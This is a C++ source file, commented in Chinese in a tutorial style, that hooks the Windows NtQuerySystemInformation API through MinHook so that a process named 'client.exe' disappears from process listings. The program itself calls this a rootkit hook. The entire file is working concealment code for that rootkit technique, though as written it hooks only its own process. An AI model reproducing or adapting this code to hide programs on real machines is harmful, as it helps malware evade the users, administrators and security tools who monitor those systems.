#include <windows.h>
#include <iostream>
#include "MinHook.h"

// 定義需要的 NT 狀態碼與結構
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

// Windows 系統用來傳遞 Process 資訊的結構體
typedef struct _SYSTEM_PROCESS_INFORMATION {
    ULONG NextEntryOffset;       // 關鍵：下一個 Process 節點距離當前節點的 Offset (Byte)
    ULONG NumberOfThreads;
    BYTE Reserved1[48];
    UNICODE_STRING ImageName;    // Process 的名稱
    // 後續還有其他欄位，但我們只需要用到 ImageName 與 NextEntryOffset
} SYSTEM_PROCESS_INFORMATION, *PSYSTEM_PROCESS_INFORMATION;

// 定義 NtQuerySystemInformation 的 Function Pointer 簽章
typedef NTSTATUS(WINAPI* NTQUERYSYSTEMINFORMATION)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

// 儲存原始 API 位址的 Trampoline Pointer
NTQUERYSYSTEMINFORMATION fpNtQuerySystemInformation = nullptr;

// 我們的 Detour Function
NTSTATUS WINAPI DetourNtQuerySystemInformation(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength) 
{
    // 1. 先呼叫原始的 API，讓系統正常獲取當前的所有 Process 資訊
    NTSTATUS status = fpNtQuerySystemInformation(
        SystemInformationClass, 
        SystemInformation, 
        SystemInformationLength, 
        ReturnLength
    );

    // 5 代表 SystemProcessInformation (要求列出所有進程)
    if (status == STATUS_SUCCESS && SystemInformationClass == 5) {
        
        // 將回傳的 Buffer 轉型為結構體指標
        auto pCurrent = reinterpret_cast<PSYSTEM_PROCESS_INFORMATION>(SystemInformation);
        PSYSTEM_PROCESS_INFORMATION pPrevious = nullptr;

        while (pCurrent) {
            // 檢查當前節點的 Process 名稱是否為我們想隱藏的目標
            if (pCurrent->ImageName.Buffer && wcscmp(pCurrent->ImageName.Buffer, L"client.exe") == 0) {
                
                // 找到目標了！利用指標操作將它從 Linked List 中拔除
                if (pPrevious) {
                    if (pCurrent->NextEntryOffset == 0) {
                        // 如果目標是最後一個節點，讓前一個節點變成終點
                        pPrevious->NextEntryOffset = 0;
                    } else {
                        // 如果目標在中間，讓前一個節點直接跳過目標，指向下下個節點
                        pPrevious->NextEntryOffset += pCurrent->NextEntryOffset;
                    }
                }
            } else {
                // 只有沒被抽換時，才更新 pPrevious
                pPrevious = pCurrent;
            }

            // 如果 NextEntryOffset 為 0，代表走到鏈表末端了
            if (pCurrent->NextEntryOffset == 0) {
                break;
            }

            // 依據 Offset 移動指標到下一個結構體畫布
            pCurrent = reinterpret_cast<PSYSTEM_PROCESS_INFORMATION>(
                reinterpret_cast<PBYTE>(pCurrent) + pCurrent->NextEntryOffset
            );
        }
    }

    return status;
}

int main() {
    MH_Initialize();

    // 從 ntdll.dll 中動態取得 NtQuerySystemInformation 的位址
    HMODULE hNtDll = GetModuleHandleW(L"ntdll.dll");
    if (hNtDll) {
        auto pTarget = reinterpret_cast<LPVOID>(GetProcAddress(hNtDll, "NtQuerySystemInformation"));

        // 建立並啟用 Hook
        if (MH_CreateHook(pTarget, &DetourNtQuerySystemInformation, reinterpret_cast<LPVOID*>(&fpNtQuerySystemInformation)) == MH_OK) {
            MH_EnableHook(pTarget);
            std::cout << "Rootkit Hook 啟用成功！現在這支程式已經看不見 client.exe 了。" << std::endl;
        }
    }

    // 保持程式運行，你可以試著在這段時間內利用本程式呼叫相關 API 驗證
    std::cout << "按任意鍵結束並解除 Hook..." << std::endl;
    std::cin.get();

    MH_DisableHook(MH_ALL_HOOKS);
    MH_Uninitialize();
    return 0;
}